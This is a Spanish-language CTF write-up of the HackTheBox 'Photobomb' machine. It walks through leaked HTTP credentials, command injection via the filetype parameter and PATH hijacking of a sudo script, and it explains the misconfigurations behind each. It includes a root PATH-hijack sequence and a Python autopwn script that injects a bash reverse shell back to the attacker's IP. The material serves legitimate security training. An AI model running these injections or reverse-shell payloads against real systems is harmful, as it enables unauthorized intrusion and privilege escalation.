---
title: Hackthebox Writeup Photobomb
date: 2022-11-02 16:55:16 pm
categories: [HTB, Writeups]
tags: [HTB, Linux, Easy, Information Leakage, Command Inyection, Path Hijacking, Python Scripting]

img_path: /assets/img/htb/writeups/photobomb
---

# Overview

1. Http authentication credentials by **Information leak** in a server file
2. **Command Inyection** by unsanitized user input on file download (Foothold)
3. **Path Hijacking** to remote command execution as a privileged user by a bash script (Privilege Escalation)

![Logo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.182 |  08 Oct 2022 |    Easy    |   20   |

* * *

Antes de empezar verificamos que estamos conectado a la **VPN** de HTB y tenemos conexión con la máquina:

```shell
> ping -c1 10.10.11.182
PING 10.10.11.182 (10.10.11.182) 56(84) bytes of data.
64 bytes from 10.10.11.182: icmp_seq=1 ttl=63 time=102 ms
                                          \______________________ Linux Machine
--- 10.10.11.182 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
          \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 101.974/101.974/101.974/0.000 ms
```

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Empezamos con la fase de reconocimiento haciendo un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir los puertos abiertos de la máquina:

```console
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 17:04 -05
Nmap scan report for 10.10.11.182
Host is up (0.12s latency).
Not shown: 65140 closed tcp ports (reset), 393 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
              \_________________ Secure Shell Protocol
80/tcp open  http
              \_________________ Hypertext Transfer Protocol
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> --open : Escanear solo puertos abiertos
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo

Ahora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos **22(SSH)** - **80(HTTP)**:

```console
❯ nmap -p22,80 -sCV 10.10.11.182 -oN open_ports_TCP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 17:08 -05
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux, protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux, CPE: cpe:/o:linux:linux_kernel
```

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear
>
> -sCV (Fusión de parámetros -sC -sV)
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
>
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap

Ya que no disponemos de credenciales omitimos el puerto **22 (SSH)** y empezamos escaneando el las tecnologias del servicio web en el puerto **80 (HTTP)**:

> Usando `whatweb`

```console
❯ whatweb 10.10.11.182
http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://photobomb.htb/ - no address for photobomb.htb <-- Redirection
```

> Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión [Wappalyzer](https://www.wappalyzer.com/apps/)
{: .prompt-info}

Observamos que tenemos un **código de estado 302 (Moved Temporarily)**, el cuál es un **mensaje de redirección** que ocurre cuando el recurso que solicitamos ha sido temporalmente movido a otra ubicación

En esta ocasión al intentar ingresar al servicio web `http://10.10.11.182` existe una redirección hacia `http://photobomb.htb`, él cual es un **nombre de dominio** que usa el sistema **Domain Name System (DNS)** que nos facilita la búsqueda de cualquier recurso en internet y así no estar escribiendo la dirección ip en cuestión

Además, existe una relación con el concepto de **Virtual Hosting**, el cuál nos permite asociar a una misma dirección ip varios **nombres de dominios** donde cada uno de estos sea un servicio web completamente diferente a los demás. Para que nosotros podamos acceder a este dominio necesitamos asociarla con su respectiva ip, por ello debemos agregar está información a nuestro archivo del sistema **encargado de asociar/resolver/apuntar una ip a un nombre de dominio** _/etc/hosts_ : `echo '10.10.11.182 photobomb.htb' >> /etc/hosts`

```console
❯ whatweb 10.10.11.182
http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]
http://photobomb.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], Script, Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Observamos que ahora podemos resolver de manera correcta el nombre de dominio `photobomb.htb` y con ello poder enumerar las tecnologías y sus respectivas versiones para inicialmente, a manera general, buscar vulnerabilidades existentes

Con el conocimiento previo de las tecnologías procedemos a visualizar la interfaz de la web:

> Usando el navegador `chromium`

![Photobomb.htb](photobomb_htb.png){: .shadow}

De primeras observamos un mensaje de bienvenida y el mensaje _To get started, please click here! (the credentials are in your welcome pack)_ que si hacemos **Hoovering** sobre el **Hyperlink** observamos que nos redirige hacia `photobomb.htb/printer` y justamente nos pide unas credenciales:

![Photobomb.htb/printer\_login](photobomb_htb_printer-login.png){: .shadow}

Ya que nos disponemos de ningun pack de bienvenida, podemos seguir enumerando los recursos que se cargan al entrar a la web:

> Web Development Tools `Network`

![Photobomb.htb\_devtools](photobomb_htb_devtools.png){: .shadow}

Observamos por la pestaña `Initiator` que uno de los archivos que se cargan al iniciar la página actual (index) es `photobomb.js`, y relacionando con el mensaje del pack de bienvenida, examinamos su contenido y encontramos lo siguiente:

> Web Development Tools `Sources`

![Photobomb.htb\_photobomb.js](photobomb_htb_photobomb_js.png){: .shadow}

Vemos que hace un **match** de nuestras `cookies` usando _expresiones regulares_ para validar que si tenemos una cookie con el nombre `isPhotoBombTechSupport` y cualquier valor, entonces se cambiará el **Hyperlink** que teniamos antes (http://photobomb/printer) a `http://pH0t0:b0Mb!@photobomb.htb/printer` que es una manera de authenticación por **HTTP** (lo mismo que poner las credenciales en el cuadro anterior)

> También podemos crear una cookie **isPhotoBombTechSupport=anything**, recargar y dirigirnos a `/printer`
{: .prompt-info}

> Si quieres aprender como usar _expresiones regulares_ te recomiendo está página muy interactiva: [https://regexone.com](https://regexone.com)
{: .prompt-tip}

## Foothold

* * *

Ahora solo entramos a la ruta `/printer` y tenemos la siguiente interfaz:

![Photobomb.htb/printer](photobomb_htb_printer.png){: .shadow}

Examinando la web sabemos que tiene la funcionalidad de descargar las imágenes de la página. Por ello, siempre que tengamos está funcinalidad de **subir o descargar un archivo** es importante analizar que el lo que se envía por la petición. Para ello procedemos a interceptar la petición:

> Usando `burpsuite` como proxy intermediario

![Photobomb.htb/printer\_burpsuite](photobomb_printer_burpsuite.png){: shadow}

Observamos que en la petición por **POST** se pasan los parámetros `photo`, `filetype` y `dimensions`. Probando cambiar los valores para apuntar a otro archivo local o cambiar el nombre de los parámetros con el objetivo de generar algún error, obtuve lo siguiente:

![Photobomb.htb\_sinatra\_error](photobomb_printer_sinatra_error.png){: .shadow}

> Este error es parte de una configuración del Framework minimalista `Sinatra` del lenguaje `Ruby` que nos sirve para construir aplicaciones web del lado del servidor (backend). Obviamente comparte información sensible que pueden aprovecar los atacantes
{: .prompt-info}

Solo podemos ver parte del código donde se valida el parametro `filetype` con la _expresión regular_ `^(png|jpg)` lo cúal solo permite como válido cualquier cadena que empiece por `png` o `jpg`, lo cúal es bastando peligroso, probemos esto:

![Photobomb.htb/printer\_filetype\_test\_burpsuite.png](photobomb_printer_filetype_test_burpsuite.png){: .shadow}

Validamos la visualización de nuestro input, por ello podemos pensar en la vulnerabilidad de **Command Inyection** que nos permite como atacante **ejecutar comandos en el sistema operativo** que por detrás esté usando el input del usuario en funciones como `system()` o `exec()`. Para ello hacemos una **Prueba de concepto (Proff of concept)**:

> Nos ponemos en escucha con `tcpdump` y pasamos como input una traza ICMP con `ping` hacia nuestra IP

![Photobomb\_command\_injection\_POC](command_injection_poc.png){: shadow}

> Tienes mas información en Hacktricks sobre la vulnerabilidad [Command Inyection](https://book.hacktricks.xyz/pentesting-web/command-injection)
{: .prompt-info}

Ya que tenemos ejecución remota de comandos, solo nos queda inyectar una **reverse shell** con bash, entrar como el usuario `wizard` y conseguimos la flag:

![Phtobomb\_footold](photobomb_foothold.png){: .shadow}

Ya que tenemos acceso al sistema, repasemos las malas prácticas que nos permitieron el acceso:

> (1) Exponer en scripts sobre la funcionalidad de la web información sensible como credenciales (file: photobomb.js)

> (2) No sanitizar correctamente el input del usuario (file: /home/wizard/photobomb/server.rb)

```ruby
# ...
if !filetype.match(/^(png|jpg)/) <--- Here (1)
    halt 500, 'Invalid filetype.'
  end

  if !dimensions.match(/^[0-9]+x[0-9]+$/)
    halt 500, 'Invalid dimensions.'
  end

  case filetype
  when 'png'
    content_type 'image/png'
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype (2)
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename (3)
    puts "Executing: #{command}"
    system(command) <--- COMMAND EXECUTION (4)
  else
    puts "File already exists."
  end
# ...
```

## Privilege Escalation

* * *

Empezamos con una enumeración básica del sistema como usuarios `wizard`, y rápidamente listando los comandos, con sus respectivos permisos, que podemos ejecutar `sudo -l` encontramos lo siguiente:

```console
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Obervamos que podemos ejecutar el binario `/opt/cleanup.sh` como el usuario `root` y se asigna los tags `SETENV` **(sirve para asignar variables de entorno)** y `NOPASSWD` **(ejecutar el comando sin requerir una contraseña)**. Veamos el contenido del archivo:

> file: `/opt/cleanup.sh`

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Lo que hace el script es (1) ejecutar el archivo _/opt/.bashrc_, él cual es un script con configuraciones respecto a la sessión de la terminal cuando un usuario se logea. (2) Luego limpia los logs de la web que anteriormente vulneramos y (3) por último vemos algo interesante, se aplica una búsqueda con el comando `find` sin usar su ruta absoluta

Inmediatamente al observar esto se nos viene a la mente la vulnerabilidad **Path Hijacking (secuestro de rutas)** que nos permite secuestrar las rutas habituales que se definen en la variable de entorno **PATH** y asignar nuestras propias rutas junto con nuestros archivos maliciosos

Entonces lo que podemos hacer es crearnos un archivo también llamado `find` en una ruta determinada (/tmp/.10.1014.155/find) y con el tag `SETENV` agregar a la variable de entorno `PATH` nuestra ruta donde se encuentra nuestro archivo malicioso para luego ejecutarlo, conseguir la `shell` como `root` y la flag:

```console
wizard@photobomb:~/photobomb$ mkdir /tmp/.10.10.14.155
wizard@photobomb:~/photobomb$ cat >> /tmp/.10.10.14.155/find
#!/bin/bash

chmod u+s /bin/bash
wizard@photobomb:~/photobomb$ cat /tmp/.10.10.14.155/find 
wizard@photobomb:~/photobomb$ chmod +x /tmp/.10.10.14.155/find 
wizard@photobomb:~/photobomb$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
wizard@photobomb:~/photobomb$ sudo PATH=/tmp/.10.10.14.155:$PATH /opt/cleanup.sh
wizard@photobomb:~/photobomb$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
wizard@photobomb:~/photobomb$ bash -p
bash-5.0# whoami
root
bash-5.0# find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Nov  3 05:54 /root/root.txt
```

Para finalizar hice un script en `python` para automatizar todo el proceso y conseguir la shell como `root`:

```python
#!/usr/bin/env python3

"""
Autopwn Photobomb HTB
---------------------
Author : Marss
Date : 01 Nov, 2022
"""

import argparse
import requests
import signal
import sys
import shlex
import subprocess

from pwn import *


# Ctrl + c (function)
def signal_handler(signum, frame): sys.exit('\n[!] User terminated.')

# Ctrl + c (signal)
signal.signal(signal.SIGINT, signal_handler)


# Main class
class Exploit:
	def __init__(self, args):
		self.target_url = { '10.10.14.182' : 'http://photobomb.htb' }
		self.ip_address = args.ip
		self.port = args.port

	def make_request(self, command):
		try:
			headers = {
				'Authorization' : 'Basic cEgwdDA6YjBNYiE=',
				'Content-Type' : 'application/x-www-form-urlencoded'
			}

			form_data = {
				'photo' : 'eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg',
				'filetype' : f'jpg;{command}',
				'dimensions' : '3000x2000'
			}
			
			response = requests.post(self.target_url['10.10.14.182'] + '/printer', headers=headers, data=form_data)
			
		except Exception as error:
			sys.exit("[x] Error: %s" % error)

	def command_inyection(self, command):
			self.make_request(command)

	def run(self):
		# Post request with command injection
		with log.progress('Starting Inyection Attack') as progress:

		    # (1) Create workstation
		    progress.status('Creating working directory')
		    self.command_inyection(f"mkdir /tmp/.{self.ip_address}")
		    log.info('Working directory created')
		    
		    # (2) Create binary with malicious code (reverse shell in bash)
		    progress.status('Inyecting malicious code into our binary file')
		    self.command_inyection(f"echo \"#!/bin/bash\\nbash -c 'bash -i >& /dev/tcp/{self.ip_address}/{self.port} 0>&1'\" > /tmp/.{self.ip_address}/find && chmod +x /tmp/.{self.ip_address}/find")
		    log.info(f'Binary created: /tmp/.{self.ip_address}/find')
		    
		    # (3) Listening mode
		    log.info(f'Open port {self.port} to receive root shell (g.e /usr/bin/nc -l {self.port})')
		    input('Press ENTER to continue.')
		    
		    # (4) Execute binary like root to receive shell
		    progress.success('Getting connection in a few seconds')
		    self.command_inyection(f"sudo PATH=/tmp/.{self.ip_address}:$PATH /opt/cleanup.sh")

		    # (5) Removing working directory and binary file
		    log.info('Removing working directory and files')
		    self.command_inyection(f"rm -rf /tmp/.{self.ip_address}")


# Main flow
if __name__ == '__main__':
	ascii_title = """
	                               __
	 /\      |_  _   _       _    |__) |_   _  |_  _  |_   _   _  |_ 
	/--\ |_| |_ (_) |_) \)/ | )   |    | ) (_) |_ (_) |_) (_) ||| |_)
	                |                                                
	                                                            by marss
  """
	parser = argparse.ArgumentParser(
		description=ascii_title,
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		""")

	parser.add_argument('-i', '--ip', required=True, help='specified IP to receive the shell')
	parser.add_argument('-p', '--port', required=True, help='specified PORT to receive the shell')

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)

	exploit.run()
```

![Autopwn](autopwn.png){: .shadow}

> Puedes encontrar el script en mi repositorio: [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Autopwn_Photobomb)
{: .prompt-info}

Como último veamos las malas prácticas que nos permitieron escalar privilegios:

> Asignar a un usuario del sistema la ejecución de comandos como un usuario privilegiado (file: /etc/sudoers.d/photobomb)

```console
wizard photobomb = (root) NOPASSWD:SETENV: /opt/cleanup.sh
```

> Máss información sobre el archivo `sudoers`: [https://www.digitalocean.com/community/tutorials/how-to-edit-the-sudoers-file](https://www.digitalocean.com/community/tutorials/how-to-edit-the-sudoers-file)
{: .prompt-info}

> Sumando a lo anterior. Usar binarios del sistema sin asignar su ruta absoluta del sistema (file: /opt/cleanup.sh)

```bash
#...
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
